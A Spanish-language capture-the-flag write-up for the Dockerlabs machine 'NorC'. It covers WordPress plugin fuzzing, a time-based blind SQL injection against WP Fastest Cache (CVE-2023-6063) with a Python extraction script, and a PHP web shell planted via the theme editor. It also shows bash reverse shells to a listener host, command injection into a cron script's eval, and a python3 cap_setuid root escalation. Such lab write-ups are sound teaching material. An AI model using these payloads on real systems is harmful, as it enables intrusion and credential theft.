---
title: NorC - Hard (Dockerlabs)
permalink: /Norc-Dockerlabs-Writeup/
tags:
  - "Linux"
  - "Hard"
  - "Wordpress"
  - "SQL Injection" 
  - "CVE-2023-6063"
  - "Command Injection"
  - "Capabilities"
categories:
  - writeup
  - hacking
  - dockerlabs
  - "hacking web"
toc: true
toc_label: Topics
toc_sticky: true
sidebar:
  - main
  - docs
seo-title: NorC - Hard (Dockerlabs)
seo-description: Pon a prueba tus habilidades de enumeración de Wordpress, explotación de SQL Injection y abuso de capabilities para vencer NorC.
excerpt: Pon a prueba tus habilidades de enumeración de Wordpress, explotación de SQL Injection y abuso de capabilities para vencer NorC.
header:
  overlay_image: /assets/images/headers/norc-dockerlabs.jpg
  overlay_filter: 0.7
  og_image: /assets/images/headers/norc-dockerlabs.jpg
---
 
![image-center](/assets/images/posts/norc-dockerlabs.png){: .align-center}

**Habilidades:** Wordpress Plugins Fuzzing, Time Based SQL Injection - (CVE-2023-6063), Credentials Leakage,  Abusing Wordpress Theme File Editor to RCE, Command Injection, Python Capability - `cap_setuid` [Privilege Escalation]
{: .notice--primary}

# Introducción

Norc es una máquina de dificultad `Difícil` de la plataforma Dockerlabs. Revisaremos diversos conceptos relacionados con la explotación de vulnerabilidades web dentro de Wordpress. Combinaremos diversas técnicas para lograr colarnos dentro del sistema y poder escalar entre usuarios hasta tener el control total del sistema. 

<br>

# Reconocimiento
---

## Nmap Scanning

Empezaremos haciendo un escaneo de puertos abiertos por TCP

~~~ bash
nmap -p- --open -sS --min-rate 5000 -n -Pn 172.17.0.2 -oG openPorts 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-30 14:05 EDT
Nmap scan report for 172.17.0.2
Host is up (0.000011s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 02:42:AC:11:00:02 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 1.48 seconds
~~~

Haremos un segundo escaneo donde lanzaremos un conjunto de scripts de reconocimiento, además de detectar la versión del servicio que se ejecutan en los puertos que encontramos

~~~ bash
nmap -sVC -p 22,80 172.17.0.2 -oN services
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-30 14:06 EDT
Nmap scan report for 172.17.0.2
Host is up (0.000047s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 8c:5c:7b:fe:79:92:7a:f9:85:ec:a5:b9:27:25:db:85 (ECDSA)
|_  256 ba:69:95:e3:df:7e:42:ec:69:ed:74:9e:6b:f6:9a:06 (ED25519)
80/tcp open  http    Apache httpd 2.4.59 ((Debian))
|_http-server-header: Apache/2.4.59 (Debian)
|_http-title: Did not follow redirect to http://norc.labs/?password-protected=login&redirect_to=http%3A%2F%2F172.17.0.2%2F
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.84 seconds
~~~

Vemos que se encuentran abiertos únicamente el puerto `22`, que corresponde a `ssh`, y al puerto `80`, que es el puerto usado comúnmente para el protocolo HTTP


## Web Analysis

Si miramos la información del puerto `80`, vemos que nos intenta redirigir a `norc.labs`, pero nuestra máquina no conoce ese nombre de dominio

![image-center](/assets/images/posts/norc-web-analysis.png){: .align-center}

Se está aplicando `virtual hosting` en esta máquina, por lo que nosotros por ahora no conocemos `norc.labs`, entonces para que pueda hacer la redirección, agregamos este dominio a nuestro archivo `/etc/hosts` para que la IP del contendor haga referencia a `norc.labs`

~~~ text
172.17.0.2 norc.labs
~~~

Antes de navegar hasta la web, haremos un escaneo de las tecnologías que pueda utilizar este servicio

~~~ bash
whatweb http://norc.labs                                                      
http://norc.labs [302 Found] Apache[2.4.59], Country[RESERVED][ZZ], HTTPServer[Debian Linux][Apache/2.4.59 (Debian)], IP[172.17.0.2], RedirectLocation[http://norc.labs/?password-protected=login&redirect_to=http%3A%2F%2Fnorc.labs%2F], Strict-Transport-Security[max-age=15768000;includeSubdomains], UncommonHeaders[x-redirect-by,content-security-policy], X-XSS-Protection[1; mode=block]

http://norc.labs/?password-protected=login&redirect_to=http%3A%2F%2Fnorc.labs%2F [200 OK] Apache[2.4.59], Cookies[wordpress_test_cookie], Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2.4.59 (Debian)], IP[172.17.0.2], PasswordField[password_protected_pwd], Script, Strict-Transport-Security[max-age=15768000;includeSubdomains], UncommonHeaders[content-security-policy], X-XSS-Protection[1; mode=block]
~~~

Si visitamos la web nuevamente podremos ver la siguiente página

![image-center](/assets/images/posts/norc-web-analysis-2.png){: .align-center}

Vemos que ahora nos redirige, y nos encontramos con el siguiente formulario donde nos pide ingresar una contraseña


### Web Analysis - Wordpress

Como no disponemos de credenciales válidas para iniciar sesión en el panel anterior, podemos interceptar la solicitud para ver cómo se tramitan hacia el servidor. El siguiente bloque corresponde a una solicitud interceptada con un proxy HTTP, no importa si es `Burpsuite`, `Caido`, o si enviaste una solicitud con `curl`

~~~ bash
GET /?password-protected=login&redirect_to=http%3A%2F%2F172.17.0.2%2F HTTP/1.1
Host: norc.labs
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:133.0) Gecko/20100101 Firefox/133.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Sec-GPC: 1
Connection: keep-alive
Cookie: wordpress_test_cookie=WP%20Cookie%20check
Upgrade-Insecure-Requests: 1
Priority: u=0, i
~~~

¿Acabamos de ver una cookie que hace referencia a Wordpress? (`wordpress_test_cookie`), ya por el nombre suena bastante raro. Probemos intentar navegar hasta `wp-admin`, que es una ruta común en Wordpress

![image-center](/assets/images/posts/norc-wordpress-1.png){: .align-center}

Nos redirige al inicio de sesión al panel de administración de Wordpress. Si intentamos ingresar credenciales nos aparece este mensaje, al parecer tenemos intentos limitados, no quieren que hagamos fuerza bruta al login

![image-center](/assets/images/posts/norc-wordpress-2.png){: .align-center}

### Web Analysis - Ghost Login

El aspecto de la URL luce un tanto peculiar, en vez de ir directamente a `wp-admin`, estamos dentro de una página `ghost-login` que nos hace una redirección

~~~ bash
http://norc.labs/ghost-login?redirect_to=http%3A%2F%2Fnorc.labs%2Fwp-admin%2F&reauth=1
~~~

Analizaremos las tecnologías utilizadas (como el gestor de contenido) en la web actual con ayuda de herramientas como `Wappalyzer` o `Whatweb`

~~~ bash
whatweb http://norc.labs/ghost-login
http://norc.labs/ghost-login [200 OK] Apache[2.4.59], Cookies[wordpress_test_cookie], Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2.4.59 (Debian)], IP[172.17.0.2], JQuery, MetaGenerator[Drupal 8 (https://www.drupal.org)], PasswordField[pwd], PoweredBy[WordPress], Script[text/javascript], Strict-Transport-Security[max-age=15768000;includeSubdomains], Title[Log In &lsaquo; Keep Studying, you&#039;all achieve it!!! &#8212;], UncommonHeaders[content-security-policy], X-Frame-Options[SAMEORIGIN], X-XSS-Protection[1; mode=block]
~~~

El título de la página hace referencia a que sigamos estudiando, que lo conseguiremos. Pues gracias de todo corazón

~~~ text
Log In < Keep Studying, you'all achieve it!! --
~~~

Podemos ver que se está ejecutando `Drupal 8`, pero nos está mostrando un Wordpress, esto es un tanto interesante


## (Posible) Fuzzing

Intentemos descubrir rutas o archivos posibles bajo el dominio `norc.labs` usando un diccionario que contenga rutas comunes para este gestor de contenido

~~~ bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/CMS/Drupal.txt -mc 200 -r -u http://norc.labs/FUZZ 
~~~

Encontraremos un `robots.txt`, que es un archivo comúnmente usado para gestionar la navegación en un sitio web, echemos un vistazo

~~~ bash
curl http://norc.labs/robots.txt
User-agent: *

Sitemap: http://norc.labs/wp-sitemap.xml
~~~

El archivo `sitemap` contiene una lista de todas las páginas de un sitio web, veamos que contiene. Si navegamos hasta él nos redirige al `login` del principio, así que mejor intentemos otra cosa, como intentar buscar `plugins`

![image-center](/assets/images/posts/norc-fuzzing.png){: .align-center}


## Fuzzing Wordpress Plugins

Existe una recopilación bastante extensa de `plugins` de `wordpress` en este repositorio de `github`, es una buena opción si queremos solamente hacer fuzzing para descubrir `plugins` dentro de Wordpress

- https://raw.githubusercontent.com/RandomRobbieBF/wordpress-plugin-list/refs/heads/main/wp-plugins.lst

En mi caso lo descargaré en la carpeta actual, simplemente con `curl` podemos descargar el archivo y guardarlo, en mi caso lo llamaré `wordpress-plugins.txt`

~~~ bash
curl -sL https://raw.githubusercontent.com/RandomRobbieBF/wordpress-plugin-list/refs/heads/main/wp-plugins.lst -o wordpress-plugins.txt
~~~

Una vez tengamos nuestro diccionario de `plugins` preparado, lanzaremos una herramienta para hacer el fuzzing

~~~ bash
wfuzz -c --hc 4044 -L -w wordpress-plugins.txt http://norc.labs/FUZZ

********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://norc.labs/FUZZ
Total requests: 57720

=====================================================================
ID           Response   Lines    Word       Chars       Payload       
=====================================================================
000052588:   200        281 L    2280 W     16210 Ch    "/wp-content/plugins/wp-fastest-cache/readme.txt"
~~~

- `-w`: Ruta al diccionario a utilizar
- `-c`: Formato en colores
- `-L`: Seguir el código de estado de redirección (`302`)
- `--hc`: No mostrar los códigos de estado que especifiquemos

Luego de una larga espera, la herramienta ha encontrado el archivo `readme.txt` del plugin `wp-fastest-cache`

- `/wp-content/plugins/wp-fastest-cache/readme.txt`

Podemos ver la versión del `plugin` y ver si existe alguna vulnerabilidad conocida para la versión de estos `plugins`, podemos extraer la versión con el siguiente comando que busca dentro de los archivos encontrados

~~~ bash
curl -sL http://norc.labs/wp-content/plugins/wp-fastest-cache/readme.txt | grep "Stable" | awk -F ':' '{print $2}' | xargs echo 'version: '

version:  1.2.1
~~~

Este plugin tiene un CVE que afecta a la versión que se está ejecutando en la web

- https://wpscan.com/blog/unauthenticated-sql-injection-vulnerability-addressed-in-wp-fastest-cache-1-2-2/

<br>

# Intrusión / Explotación 
---
## Unauthenticated Time Based SQL Injection - CVE-2023-6063 

Esta vulnerabilidad es de tipo `Time Based`, por lo que podremos saber si nuestras consultas se ejecutan mediante una espera por parte de la respuesta del servidor

- https://github.com/Eulex0x/CVE-2023-6063

**En este caso, tendríamos una cookie que es vulnerable, `wordpress_logged_in`**


## SQL Injection - Python Scripting

Podemos hacer una explotación mediante la herramienta `sqlmap`, que hará que el ataque sea automatizado, pero intentaremos entender cómo funcionan las consultas que se están enviando.

Generalmente existe una base de datos `wordpress`, entonces debemos ajustar `sqlmap` para que haga consultas a esta base de datos

~~~ bash
sqlmap --dbms=mysql -u "http://norc.labs/wp-login.php" --cookie='wordpress_logged_in=*' --level=2 -D wordpress -T wp_users --dump --batch
-v2
~~~

- `--dmbs`: Definir el motor de base de datos, en este caso `mysql`
- `-u`: URL
- `--cookie='wordpress_logged_in=*'`: Asignar una cookie a la consulta, **esta cookie es vulnerable a SQL Injection**
- `*`: Valor donde se ingresa el `payload`, en este caso, en la cookie `wordpress_logged_in`
- `--level`: Indica el nivel de intensidad en las pruebas
- `-D`: Especificar el nombre de la base de datos
- `-T`: Nombre de una tabla
- `--dump`: Listar los registros
- `--batch`: Omitir las preguntas al usuario
- `-v2`: Ver información por consola

Según los logs de `sqlmap`, podremos ver la consulta que estaría efectuando para explotar SQL Injection, **esto es importante para elaborar nuestro exploit**

~~~ text
---
Parameter: Cookie #1* ((custom) HEADER)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: wordpress_logged_in=" AND (SELECT 7667 FROM (SELECT(SLEEP(5)))TXGt) AND "YlCM"="YlCM
~~~


Usaremos el payload que usa `sqlmap`, lo modificaremos para crear un script y hacer el proceso más manual y controlado por nosotros

En primera instancia, validaremos este payload haciendo una solicitud con `curl`

~~~ bash
curl -sLI http://norc.labs/wp-admin -H 'Cookie: wordpress_logged_in=" AND (SELECT 1 FROM (SELECT(SLEEP(5)))TempTable) AND "a"="a'
~~~

Si la query se interpreta correctamente, recibiremos la respuesta después de cinco segundos. Ahora podemos hacer una consulta a la tabla `wp_users` para extraer el valor del campo `user_pass`. Haremos uso de un condicional más una iteración con `SUBSTRING` en el valor que buscamos para poder evaluar una serie de caracteres

~~~ bash
curl -sLI http://norc.labs/wp-admin -H 'Cookie: wordpress_logged_in=" AND (SELECT (IF((BINARY SUBSTRING((SELECT user_pass FROM wp_users WHERE user_login="admin"),1,1)="a"),SLEEP(3), SLEEP(0))) FROM (SELECT 1)TempTable) AND "a"="a'
~~~

Si lo definimos en un script de `python` nos quedará un código parecido a este. A continuación os dejo el script para que puedan analizarlo

- URL del script

~~~ python
import requests
import time
import string
from pwn import log
import signal

delay = 5 # Recomendable no dejar en menos de 2
chars = string.ascii_lowercase + string.ascii_uppercase + string.digits + string.punctuation  # Caracteres imprimibles

"""
    Trap CTRL + C
"""
def def_handler(sig, frame):
    print("[!] Exiting...")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

"""
	Extraer la contraseña en formato hash
"""
def dump_pass(url):
    hash_value= ""
    bar = log.progress("Blind SQLi - WP Fastest Cache 1.2.2")
    bar2 = log.progress(f"Extracting data from {url}...")
    try:
        for position in range(1,35):
            for char in chars:
                bar.status("Probando " + char) 
                start_time = time.time()

                payload = f'" AND (SELECT (IF((BINARY SUBSTRING((SELECT user_pass FROM wp_users WHERE user_login="admin"),{position},1)="{char}"),SLEEP({delay}), SLEEP(0))) FROM (SELECT 1)TempTable) AND "a"="a'

                cookies = {"wordpress_logged_in": payload}

                response = requests.get(url, cookies=cookies)
                end_time = time.time()
                elapsed_time = end_time - start_time
                
                # Si el tiempo de respuesta es mayor al umbral, el carácter es correcto
                if elapsed_time > delay:
                    hash_value += char 
                    bar2.status(hash_value)
                    is_valid_hash = check_hash(url, hash_value)
                    if is_valid_hash:
                        log.success(f"Pass for admin: {is_valid_hash}")
                        sys.exit(0)
                    break
    except Exception as e:
        log.error("Error" + str(e))


def check_hash(url, hash_value):
    try:
        start_time = time.time()
        payload = f'" AND (SELECT (IF((BINARY(SELECT user_pass FROM wp_users WHERE user_login="admin")="{hash_value}"),SLEEP(5), SLEEP(0))) FROM (SELECT 1)TempTable) AND "a"="a'

        cookies = {"wordpress_logged_in": payload}
        response = requests.get(url, cookies=cookies)
        end_time = time.time()

        elapsed_time = end_time - start_time
        if elapsed_time > delay:
            return str(hash_value)

    except Exception as e:
        print("[-] Error: " + str(e))

if __name__ = '__main__':
	dump_pass("http://norc.labs/wp-login.php")
~~~

Esta sería la información que logramos extraer

~~~ bash
Database: wordpress
Table: wp_users

user_pass -> $P$BeNShJ/iBpuokTEP2/94.sLS8ejRo6.
user_login -> admin@oledockers.norc.labs
~~~

- Tenemos por un lado la contraseña en formato `hash`, que intentaremos crackearlo más adelante
- Vemos el nombre de usuario `admin`
- Se nos muestra un dominio para el usuario `admin`, `oledockers.norc.labs`

Agregaremos este nuevo dominio a nuestro archivo `/etc/hosts`

~~~ bash
cat /etc/hosts | grep norc.labs   

172.17.0.2 norc.labs oledockers.norc.labs
~~~


## (Failed) Hash Cracking 

`Hashes.com `nos da una pista sobre el algoritmo utilizado para encriptar esta contraseña, en este caso `phpass`, esto podemos verlo además con la herramienta `hashid`

~~~ bash
hashid '$P$BeNShJ/iBpuokTEP2/94.sLS8ejRo6.'
Analyzing '$P$BeNShJ/iBpuokTEP2/94.sLS8ejRo6.'
[+] Wordpress ≥ v2.6.2 
[+] Joomla ≥ v2.5.18 
[+] PHPass' Portable Hash 
~~~

Antes de intentar crackearlo, guardamos el hash en un archivo, en mi caso `hash.txt`

~~~ bash
echo '$P$BeNShJ/iBpuokTEP2/94.sLS8ejRo6.' > hash.txt
~~~

Procederemos con el ataque al `hash` que obtuvimos con `john`, sin embargo no tendremos éxito

~~~ bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
~~~

Volvamos a ver los datos que recolectamos, si exploramos el nuevo dominio en el navegador, nos redirige a lo siguiente

![image-center](/assets/images/posts/norc-credential-leak.png){: .align-center}

Bueno... Podemos usar esta nueva contraseña para intentar entrar directamente en `wp-admin`

~~~ txt
admin:wWZvgxRz3jMBQ ZN
~~~

![image-center](/assets/images/posts/norc-login-success.png){: .align-center}

Al parecer el hash que obtuvimos es el resultado de esta contraseña, la cual no figura dentro del archivo `rockyou.txt`

![image-center](/assets/images/posts/norc-wordpress-dashboard.png){: .align-center}

¡Estamos dentro de `wordpress`!, el siguiente paso sería buscar una forma de ganar acceso al sistema operativo


## Remote Code Execution - Abusing Theme Editor

Podemos aprovechar el editor de temas de Wordpress para editar archivos `php` de algún tema para ejecutar comandos a nivel de sistema. En mi caso, seleccionaré el tema `Twenty Twenty Three`, esto porque solemos contar con permisos de escritura en los temas por defecto de Wordpress, aunque podemos no tenerlos con temas personalizados, como es el caso del tema que está activado.

Nos vamos a `Appereance` > `Theme File Editor` o en `Tools > Theme File Editor` para editar los archivos de temas existentes en este Wordpress

![image-center](/assets/images/posts/norc-theme-editor.png){: .align-center}

Luego buscaremos un tema del cual podamos abusar, le daremos a `Select`, luego buscaremos un archivo en el cual irá nuestro código PHP, **es importante que podamos acceder a ese archivo con una solicitud**

![image-center](/assets/images/posts/norc-theme-editor-2.png){: .align-center}

En mi caso he seleccionado el archivo `hidden-404.php`. Insertaremos un payload que nos permita ejecución de código, más o menos como se muestra a continuación

~~~ php
<?php
/**
 * Title: Hidden 404
 * Slug: twentytwentythree/hidden-404
 * Inserter: no
 */
system($_GET['cmd']);
?>
<!-- wp:spacer {"height":"var(--wp--preset--spacing--30)"} -->
<div style="height:var(--wp--preset--spacing--30)" aria-hidden="true" class="wp-block-spacer"></div>
<!-- /wp:spacer -->

<!-- wp:heading {"level":1,"align":"wide"} -->
<h1 class="alignwide"><?php echo esc_html_x( '404', 'Error code for a webpage that is not found.', 'twentytwentythree' ); ?></h1>
<!-- /wp:heading -->

<!-- wp:group {"align":"wide","layout":{"type":"default"},"style":{"spacing":{"margin":{"top":"5px"}}}} -->
<div class="wp-block-group alignwide" style="margin-top:5px">
	<!-- wp:paragraph -->
	<p><?php echo esc_html_x( 'This page could not be found.', 'Message to convey that a webpage could not be found', 'twentytwentythree' ); ?></p>
	<!-- /wp:paragraph -->

	<!-- wp:search {"label":"<?php echo esc_html_x( 'Search', 'label', 'twentytwentythree' ); ?>","placeholder":"<?php echo esc_attr_x( 'Search...', 'placeholder for search field', 'twentytwentythree' ); ?>","showLabel":false,"width":100,"widthUnit":"%","buttonText":"<?php esc_attr_e( 'Search', 'twentytwentythree' ); ?>","buttonUseIcon":true,"align":"center"} /-->
</div>
<!-- /wp:group -->

<!-- wp:spacer {"height":"var(--wp--preset--spacing--70)"} -->
<div style="height:var(--wp--preset--spacing--70)" aria-hidden="true" class="wp-block-spacer"></div>
<!-- /wp:spacer -->
~~~

Guardaremos los cambios haciendo clic en el botón `Update File` el cual se encuentra al final del bloque de edición. Debemos ver un mensaje como este: `File edited successfully`, de lo contrario, buscaremos otro tema.

Entonces ahora debemos hacer una solicitud a este archivo especificando el parámetro `cmd` en la URL

~~~ bash
http://norc.labs/wp-content/themes/twentytwentythree/patterns/hidden-404.php?cmd=whoami
~~~


## Shell as `www-data`

Enviaríamos este comando a través del parámetro `cmd`, en este caso, podemos enviar directamente el siguiente comando con algunos caracteres codificados

~~~ bash
bash -c "bash -i >&/dev/tcp/10.88.0.1/443 0>&1"
~~~

Antes de enviar la solicitud no olvidemos lanzar un `listener` con `nc`

~~~ bash
nc -lvnp 443
~~~

Finalmente ejecutamos...

~~~ bash
http://norc.labs/wp-content/themes/twentytwentythree/patterns/hidden-404.php?cmd=bash -c "bash -i >%26%2Fdev%2Ftcp%2F172.17.0.1%2F443 0>%261"
~~~

Y ya deberíamos obtener una consola como el usuario `www-data`

 ~~~ bash
nc -lvnp 443
listening on [any] 443 ...
connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 38822
bash: cannot set terminal process group (30): Inappropriate ioctl for device
bash: no job control in this shell
<.labs/wp-content/themes/twentytwentyfour/patterns$ 
 ~~~

<br>

# Escalada de privilegios
---
## Tratamiento de la TTY

Haremos un procedimiento para poder tener una consola más interactiva (`Ctrl + C`, `Ctrl + L`), en la máquina víctima ejecutamos los siguientes comandos

~~~ bash
<.labs/wp-content/themes/twentytwentyfour/patterns$ script /dev/null -c bash 
script /dev/null -c bash
Script started, output log file is '/dev/null'.
<.labs/wp-content/themes/twentytwentyfour/patterns$ export TERM=xterm
export TERM=xterm
erns$ ^Z@c052d297dce2:/var/www/norc.labs/wp-content/themes/twentytwentyfour/patte
[1]  + 270986 suspended  nc -lvnp 443
root@parrot content \# stty raw -echo;fg                                                                                                                            
[1]  + 270986 continued  nc -lvnp 443
                                     reset xterm
~~~

Por último debemos ajustar el tamaño de la terminal, vemos nuestras proporciones en **nuestra máquina atacante**

~~~ bash
stty size

44 184
~~~

Ahora usamos la salida de este comando para ajustar las proporciones en la `reverse shell`, las dimensiones podrán variar de acuerdo con el tamaño de tu ventana en la terminal

~~~ bash
www-data@c052d297dce2:/var/www/norc.labs/wp-content/themes/twentytwentyfour/patterns$stty rows 44 columns 184

www-data@c052d297dce2:/var/www/norc.labs/wp-content/themes/twentytwentyfour/patterns$ stty size 
44 184
~~~


## (Posible) System Enumeration

Primero comprobamos los privilegios sudo, pero vemos que no existe en la máquina, no sin antes cambiar unos directorios atrás (`cd ../../../../`)

~~~ bash
www-data@c052d297dce2:/var/www/norc.labs$ sudo -l
bash: sudo: command not found
~~~

Buscaremos binarios que tengan el bit SUID asignado para poder ejecutarlos con privilegios 

~~~ bash
find / -perm /4000 2>/dev/null
~~~

Vemos `exim4` al final de la salida, pero su versión no es vulnerable a CVE-2019-10149, por lo que debemos seguir buscando una forma para elevar nuestros privilegios


## System Enumeration - Capabilities

Listaremos las capabilities en la máquina víctima

~~~ bash
getcap -r / 2>/dev/null
~~~

Con `setuid` configurado en teoría podríamos elevar nuestro privilegio al cambiar el UID de la `bash`

![image-center](/assets/images/posts/norc-capabilities.png){: .align-center}

Usaremos este comando para intentar escalar privilegios aprovechando la capacidad que tenemos de cambiar el UID del proceso de `python`

~~~ python
python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
~~~

Pero vemos que no podemos ejecutar esta operación por un conflicto de privilegios, quizá estamos omitiendo algún paso o no estamos revisando lo suficiente. 

### Enumerating Users

Veamos los usuarios existentes en esta máquina para ver si podemos aprovechar recursos antes de usar herramientas automatizadas para una enumeración completa

~~~ bash
www-data@c052d297dce2:/var/www/norc.labs$ $ cat /etc/passwd | grep sh$
root:x:0:0:root:/root:/bin/bash
kvzlx:x:1000:1000::/home/kvzlx:/bin/bash
~~~

Vemos un usuario `kvzlx`, veamos si podemos ver lo que hay en su directorio en `/home`

~~~ bash
www-data@c052d297dce2:/var/www/norc.labs$ cd /home
www-data@c052d297dce2:/home$ ls
kvzlx
www-data@c052d297dce2:/home$ ls kvzlx/ -a
.  ..  .bash_logout  .bashrc  .cron_script.sh  .profile
~~~


## Command Injection

Efectivamente podemos ver el contenido de este directorio, vemos un script de `bash`, este script hace lo siguiente

~~~ bash
www-data@c052d297dce2:/home/kvzlx$ cat .cron_script.sh 
#!/bin/bash
ENC_PASS=$(cat /var/www/html/.wp-encrypted.txt)
DECODED_PASS=$(echo $ENC_PASS | base64 -d)

echo $DECODED_PASS > /tmp/decoded.txt

eval "$DECODED_PASS"
~~~

- Recibe una contraseña del archivo `.wp-encrypted.txt`
- Decodifica la contraseña que está en `base64`
- Almacena la contraseña en `/tmp/decoded.txt`
- Ejecuta la contraseña como un comando con el comando `eval`

Como está ejecutando lo que recibe del archivo `.wp-encrypted.txt` bajo el directorio `/var/www/html`, sin sanitizar su contenido, podemos inyectar un comando a nivel de sistema en este archivo, enviemos una `shell` como el usuario que ejecuta este script a nuestra máquina atacante por el puerto `4444` 

~~~ bash
echo "bash -c 'bash -i >& /dev/tcp/172.17.0.1/4444 0>&1'" | base64
~~~

~~~ bash
www-data@c052d297dce2:/home/kvzlx$ echo "bash -c 'bash -i >& /dev/tcp/172.17.0.1/4444 0>&1'" | base64 >> /var/www/html/.wp-encrypted.txt
~~~

En unos segundos recibiremos una  `shell` como el usuario `kvzlx` en `nc`

~~~ bash
nc -lvnp 4444 
listening on [any] 4444 ...
connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 34838
bash: cannot set terminal process group (5613): Inappropriate ioctl for device
bash: no job control in this shell
kvzlx@c052d297dce2:~$ id
id
uid=1000(kvzlx) gid=1000(kvzlx) groups=1000(kvzlx)
~~~

Nuevamente haremos un tratamiento para usar esta consola de forma más cómoda y con nuestras proporciones

~~~ bash
kvzlx@c052d297dce2:~$ script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
kvzlx@c052d297dce2:~$ export TERM=xterm
export TERM=xterm
kvzlx@c052d297dce2:~$ ^Z
[1]  + 285428 suspended  nc -lvnp 4444
root@parrot norc # stty raw -echo;fg
[1]  + 285428 continued  nc -lvnp 4444
                                      reset xterm
~~~

Si hacemos una vista de los procesos que este usuario ejecuta, podemos ver que se está ejecutando el archivo `.cron_script.sh` que vimos anteriormente

~~~ bash
ps -aux
~~~


## Root Time - Python3 `setuid` Capability

Siempre que tengamos acceso a un nuevo usuario debemos volver a buscar formas de escalar privilegios. como `sudo`, `suid`, `capabilities`, etc. En este caso obtuve el mismo resultado al listar las capabilities del binario `/opt/python`

~~~ bash
kvzlx@c052d297dce2:~$ /sbin/getcap -r / 2>/dev/null
/opt/python3 cap_setuid=ep
~~~

Intentaremos usar la capability `setuid` que tenemos asignada en `/opt/python` para escalar nuestro privilegio de igual forma que lo intentamos con el usuario `www-data`

Esta capacidad nos permite cambiar nuestro `uid` (User Identifier) a `0` para hacerle entender al sistema que somos `root` a nivel de usuario pero no de grupo, por lo que podremos operar como root de forma temporal hasta que cerremos la sesión

~~~ bash
kvzlx@c052d297dce2:~$ /opt/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
root@c052d297dce2:~# id
uid=0(root) gid=1000(kvzlx) groups=1000(kvzlx)
~~~
